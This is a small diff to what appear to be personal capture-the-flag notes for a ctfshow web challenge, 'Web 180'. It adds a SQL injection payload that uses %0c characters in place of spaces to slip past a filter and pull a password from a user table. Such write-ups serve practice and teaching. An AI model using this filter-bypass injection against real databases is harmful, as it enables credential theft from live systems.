@@ -314,3 +314,7 @@ We can find that `0x0c` works well:
 # Web 180
 ![[Pasted image 20250126085712.png]]
 This means `%0c` still works.
+![[Pasted image 20250126090551.png]]
+```
+999'%0cunion%0cselect'1','2',password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag
+```
